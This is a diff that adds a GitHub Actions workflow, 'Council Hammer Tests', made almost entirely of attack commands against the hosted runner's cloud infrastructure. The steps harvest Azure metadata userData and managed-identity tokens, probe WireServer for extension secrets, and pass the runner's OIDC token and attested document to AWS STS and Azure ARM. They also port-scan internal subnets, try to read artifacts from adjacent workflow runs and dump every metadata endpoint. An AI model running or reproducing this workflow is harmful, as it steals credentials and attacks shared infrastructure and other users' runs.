@@ -1,0 +1,155 @@
+name: Council Hammer Tests
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  hammer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "COUNCIL 2: Extract userData/customData (secrets hunt)"
+        run: |
+          echo "=== userData (often contains bootstrap secrets) ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 -d 2>/dev/null || echo "Empty or no userData"
+          
+          echo ""
+          echo "=== customData (deprecated but may exist) ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/customData?api-version=2019-02-01&format=text" | base64 -d 2>/dev/null || echo "Empty or no customData"
+
+      - name: "COUNCIL 2: Shared Image Gallery cross-subscription"
+        run: |
+          echo "=== Image Reference (cross-subscription pivot) ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/storageProfile/imageReference?api-version=2023-07-01" | jq .
+          
+          echo ""
+          echo "=== Full storage profile ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/storageProfile?api-version=2021-11-01" | jq '.osDisk.encryptionSettings, .dataDisks' 2>/dev/null || echo "No encryption settings"
+
+      - name: "COUNCIL 2: WireServer probe (extension secrets)"
+        run: |
+          echo "=== WireServer goalstate ==="
+          curl -s --connect-timeout 3 -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -50 || echo "WireServer blocked"
+          
+          echo ""
+          echo "=== Extension config ==="
+          curl -s --connect-timeout 3 -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=config&incarnation=1" 2>&1 | head -50 || echo "Config blocked"
+
+      - name: "COUNCIL 2: Managed Identity deep probe"
+        run: |
+          echo "=== Identity info ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" || echo "No identity info"
+          
+          echo ""
+          echo "=== Token for management.azure.com ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .
+          
+          echo ""
+          echo "=== Token for vault.azure.net ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq .
+          
+          echo ""
+          echo "=== Token for storage.azure.com ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | jq .
+
+      - name: "COUNCIL 5: OIDC Federation Attack (Azure/AWS)"
+        run: |
+          echo "=== Get OIDC token for Azure AD exchange ==="
+          OIDC_AZURE=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
+          echo "Token: ${OIDC_AZURE:0:100}..."
+          
+          # Decode to see claims
+          echo ""
+          echo "=== Token claims ==="
+          echo $OIDC_AZURE | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+          
+          echo ""
+          echo "=== Try AWS STS AssumeRoleWithWebIdentity ==="
+          # Common role patterns
+          for ACCOUNT in 123456789012 $(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq -r '.compute.subscriptionId' | cut -c1-12); do
+            curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::${ACCOUNT}:role/github-actions&RoleSessionName=test&WebIdentityToken=${OIDC_AZURE}" 2>&1 | head -20
+          done
+
+      - name: "COUNCIL 5: Attested Document abuse"
+        run: |
+          ATTESTED=$(curl -s -H "Metadata:true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" | jq -r '.signature')
+          echo "Attested doc (first 100): ${ATTESTED:0:100}..."
+          
+          echo ""
+          echo "=== Try Azure ARM with attested doc ==="
+          curl -s -w "\nHTTP: %{http_code}\n" "https://management.azure.com/subscriptions?api-version=2020-01-01" \
+            -H "Authorization: Bearer $ATTESTED" | head -20
+          
+          echo ""
+          echo "=== Try vstoken with attested doc ==="
+          curl -s -w "\nHTTP: %{http_code}\n" "https://vstoken.actions.githubusercontent.com/" \
+            -H "X-Azure-Attested-Document: $ATTESTED" | head -20
+
+      - name: "COUNCIL 5: Internal network pivot"
+        run: |
+          echo "=== Quick subnet scan ==="
+          for ip in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.10 10.1.0.254; do
+            echo -n "$ip: "
+            timeout 1 bash -c "echo >/dev/tcp/$ip/443 2>/dev/null && echo 'OPEN'" || echo "closed"
+          done
+          
+          echo ""
+          echo "=== Gateway port scan ==="
+          for port in 22 80 443 8080 8443 9000 6443; do
+            echo -n "10.1.0.1:$port - "
+            timeout 0.5 bash -c "echo >/dev/tcp/10.1.0.1/$port" 2>/dev/null && echo "OPEN" || echo "closed"
+          done
+
+      - name: "COUNCIL 5: Adjacent run token theft attempt"
+        run: |
+          echo "=== Runtime URL analysis ==="
+          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
+          
+          # Extract run ID
+          CURRENT_RUN=$(echo "$GITHUB_RUN_ID")
+          echo "Current run: $CURRENT_RUN"
+          
+          echo ""
+          echo "=== Try adjacent run artifacts ==="
+          for offset in -5 -1 1 5; do
+            TARGET=$((CURRENT_RUN + offset))
+            echo "--- Run $TARGET ---"
+            curl -s "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$TARGET/artifacts" \
+              -H "Authorization: token $GITHUB_TOKEN" 2>&1 | jq '.artifacts[].name' 2>/dev/null | head -5 || echo "No access"
+          done
+
+      - name: "COUNCIL 5: DNS exfil and internal discovery"
+        run: |
+          echo "=== Internal DNS discovery ==="
+          for host in orchestrator vstoken pipelines artifacts codeload runner; do
+            echo -n "$host.actions.githubusercontent.com: "
+            dig +short $host.actions.githubusercontent.com 2>/dev/null || echo "NXDOMAIN"
+          done
+          
+          echo ""
+          echo "=== Internal suffixes ==="
+          for suffix in internal corp github.net azure-api.net; do
+            echo -n "actions.$suffix: "
+            dig +short actions.$suffix 2>/dev/null || echo "NXDOMAIN"
+          done
+          
+          echo ""
+          echo "=== Resolver config ==="
+          cat /etc/resolv.conf
+
+      - name: "FULL IMDS DUMP"
+        run: |
+          echo "=== Complete IMDS extraction ==="
+          for endpoint in \
+            "instance?api-version=2021-12-13" \
+            "attested/document?api-version=2020-09-01" \
+            "scheduledevents?api-version=2020-07-01" \
+            "loadbalancer?api-version=2020-10-01" \
+            "versions"; do
+            echo "========================================"
+            echo "/metadata/$endpoint"
+            echo "========================================"
+            curl -s -H "Metadata:true" "http://169.254.169.254/metadata/$endpoint" | jq . 2>/dev/null || cat
+            echo ""
+          done
